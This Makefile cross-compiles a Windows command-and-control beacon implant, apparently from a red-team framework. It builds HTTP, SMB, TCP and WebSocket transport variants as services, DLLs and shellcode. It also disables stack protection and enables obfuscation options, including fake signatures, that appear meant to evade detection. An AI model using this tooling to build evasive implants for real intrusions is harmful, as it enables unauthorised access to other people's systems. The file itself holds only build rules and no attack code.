SOURCES := $(wildcard beacon/*.cpp)

BEACON_DIR := beacon
FILES_DIR := files
HTTP_DIST_DIR := objects_http
SMB_DIST_DIR := objects_smb
TCP_DIST_DIR := objects_tcp
WS_DIST_DIR := objects_ws

# Filter out incompatible connectors for each transport
HTTP_SOURCES := $(filter-out $(BEACON_DIR)/ConnectorSMB.cpp $(BEACON_DIR)/ConnectorTCP.cpp $(BEACON_DIR)/ConnectorWS.cpp, $(SOURCES))
SMB_SOURCES := $(filter-out $(BEACON_DIR)/ConnectorHTTP.cpp $(BEACON_DIR)/ConnectorTCP.cpp $(BEACON_DIR)/ConnectorWS.cpp, $(SOURCES))
TCP_SOURCES := $(filter-out $(BEACON_DIR)/ConnectorHTTP.cpp $(BEACON_DIR)/ConnectorSMB.cpp $(BEACON_DIR)/ConnectorWS.cpp, $(SOURCES))
WS_SOURCES := $(filter-out $(BEACON_DIR)/ConnectorHTTP.cpp $(BEACON_DIR)/ConnectorSMB.cpp $(BEACON_DIR)/ConnectorTCP.cpp, $(SOURCES))

HTTP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x64.o, $(HTTP_SOURCES))
HTTP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x86.o, $(HTTP_SOURCES))

SMB_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x64.o, $(SMB_SOURCES))
SMB_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x86.o, $(SMB_SOURCES))

TCP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x64.o, $(TCP_SOURCES))
TCP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x86.o, $(TCP_SOURCES))

WS_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(WS_DIST_DIR)/%.x64.o, $(WS_SOURCES))
WS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(WS_DIST_DIR)/%.x86.o, $(WS_SOURCES))

SECURITY_FLAGS := -fno-stack-protector \
        -fno-strict-overflow \
        -fno-delete-null-pointer-checks \
        -fno-strict-aliasing \
        -fno-builtin

OPTIMIZATION_FLAGS := -fno-exceptions \
            -fno-unwind-tables \
            -fno-asynchronous-unwind-tables

COMMON_FLAGS := -I $(BEACON_DIR) \
        -I ../include \
        -fpermissive \
        -w \
        -masm=intel \
        -fPIC \
        $(SECURITY_FLAGS) \
        $(OPTIMIZATION_FLAGS)

# NoCRT flags for mingw64
NOCRT_FLAGS := -nostdlib \
        -nodefaultlibs \
        -fno-exceptions \
        -fno-unwind-tables \
        -fno-asynchronous-unwind-tables \
        -DKERNEL_MODE=1 \
        -DINLINE_STD=0

# Obfuscation flags
OBFUSCATION_FLAGS := -DCONST_ENCRYPTION=1 \
        -DCFLOW_BRANCHING=1 \
        -DINDIRECT_BRANCHING=1 \
        -DFAKE_SIGNATURES=1

.PHONY: all clean pre x64 x86 ws obfus obfus_ws

NPROC := $(shell nproc)
ifeq ($(MAKELEVEL), 0)
    MAKEFLAGS += -j$(NPROC) --no-print-directory
endif

all: clean pre x64 x86
	@ # http
	@ cp $(FILES_DIR)/config.tpl $(HTTP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(HTTP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(HTTP_DIST_DIR)/stub.x86.bin
	@ # smb
	@ cp $(FILES_DIR)/config.tpl $(SMB_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(SMB_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(SMB_DIST_DIR)/stub.x86.bin
	@ # tcp
	@ cp $(FILES_DIR)/config.tpl $(TCP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(TCP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(TCP_DIST_DIR)/stub.x86.bin
	@ # ws
	@ cp $(FILES_DIR)/config.tpl $(WS_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(WS_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(WS_DIST_DIR)/stub.x86.bin

clean:
	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(WS_DIST_DIR)
	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(WS_DIST_DIR)

pre: $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(WS_DIST_DIR)

$(HTTP_DIST_DIR):
	@mkdir -p $(HTTP_DIST_DIR)

$(SMB_DIST_DIR):
	@mkdir -p $(SMB_DIST_DIR)

$(TCP_DIST_DIR):
	@mkdir -p $(TCP_DIST_DIR)

$(WS_DIST_DIR):
	@mkdir -p $(WS_DIST_DIR)

ws: $(WS_OBJECTS_X64) $(WS_OBJECTS_X86)
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x64.o
	@rm $(WS_DIST_DIR)/ConnectorHTTP.x64.o $(WS_DIST_DIR)/ConnectorSMB.x64.o $(WS_DIST_DIR)/ConnectorTCP.x64.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x86.o
	@rm $(WS_DIST_DIR)/ConnectorHTTP.x86.o $(WS_DIST_DIR)/ConnectorSMB.x86.o $(WS_DIST_DIR)/ConnectorTCP.x86.o

# Obfuscated WebSocket target with nocrt and obfusheader.h
# Simple obfuscated WebSocket target for testing
obfus_ws: clean pre
	@echo "Building obfuscated WebSocket with NoCRT..."
	@# Test with one file first
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(OBFUSCATION_FLAGS) $(NOCRT_FLAGS) -D BEACON_WS -include ../include/obfusheader.h $(BEACON_DIR)/Agent.cpp -o $(WS_DIST_DIR)/Agent.obfus.x64.o
	@echo "Obfuscated WebSocket test build completed!"

x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(WS_OBJECTS_X64)
	@ # http
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x64.o
	@rm $(HTTP_DIST_DIR)/ConnectorSMB.x64.o $(HTTP_DIST_DIR)/ConnectorTCP.x64.o $(HTTP_DIST_DIR)/ConnectorWS.x64.o
	@ # smb
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x64.o
	@rm $(SMB_DIST_DIR)/ConnectorHTTP.x64.o $(SMB_DIST_DIR)/ConnectorTCP.x64.o $(SMB_DIST_DIR)/ConnectorWS.x64.o
	@ # tcp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x64.o
	@rm $(TCP_DIST_DIR)/ConnectorHTTP.x64.o $(TCP_DIST_DIR)/ConnectorTCP.x64.o $(TCP_DIST_DIR)/ConnectorWS.x64.o
	@ # ws
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x64.o
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x64.o
	@rm $(WS_DIST_DIR)/ConnectorHTTP.x64.o $(WS_DIST_DIR)/ConnectorSMB.x64.o $(WS_DIST_DIR)/ConnectorTCP.x64.o

x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(WS_OBJECTS_X86)
	@ # http
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x86.o
	@rm $(HTTP_DIST_DIR)/ConnectorSMB.x86.o $(HTTP_DIST_DIR)/ConnectorTCP.x86.o $(HTTP_DIST_DIR)/ConnectorWS.x86.o
	@ # smb
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x86.o
	@rm $(SMB_DIST_DIR)/ConnectorHTTP.x86.o $(SMB_DIST_DIR)/ConnectorTCP.x86.o $(SMB_DIST_DIR)/ConnectorWS.x86.o
	@ # tcp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x86.o
	@rm $(TCP_DIST_DIR)/ConnectorHTTP.x86.o $(TCP_DIST_DIR)/ConnectorSMB.x86.o $(TCP_DIST_DIR)/ConnectorWS.x86.o
	@ # ws
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SVC -o $(WS_DIST_DIR)/main_service.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_WS -D BUILD_DLL -o $(WS_DIST_DIR)/main_dll.x86.o
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_WS -D BUILD_SHELLCODE -o $(WS_DIST_DIR)/main_shellcode.x86.o
	@rm $(WS_DIST_DIR)/ConnectorHTTP.x86.o $(WS_DIST_DIR)/ConnectorSMB.x86.o $(WS_DIST_DIR)/ConnectorTCP.x86.o

# Static pattern rules for each transport type
$(HTTP_OBJECTS_X64): $(HTTP_DIST_DIR)/%.x64.o : $(BEACON_DIR)/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_HTTP $< -o $@

$(HTTP_OBJECTS_X86): $(HTTP_DIST_DIR)/%.x86.o : $(BEACON_DIR)/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_HTTP $< -o $@

$(SMB_OBJECTS_X64): $(SMB_DIST_DIR)/%.x64.o : $(BEACON_DIR)/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_SMB $< -o $@

$(SMB_OBJECTS_X86): $(SMB_DIST_DIR)/%.x86.o : $(BEACON_DIR)/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_SMB $< -o $@

$(TCP_OBJECTS_X64): $(TCP_DIST_DIR)/%.x64.o : $(BEACON_DIR)/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_TCP $< -o $@

$(TCP_OBJECTS_X86): $(TCP_DIST_DIR)/%.x86.o : $(BEACON_DIR)/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_TCP $< -o $@

$(WS_OBJECTS_X64): $(WS_DIST_DIR)/%.x64.o : $(BEACON_DIR)/%.cpp
	@x86_64-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_WS $< -o $@

$(WS_OBJECTS_X86): $(WS_DIST_DIR)/%.x86.o : $(BEACON_DIR)/%.cpp
	@i686-w64-mingw32-g++ -c $(COMMON_FLAGS) -D BEACON_WS $< -o $@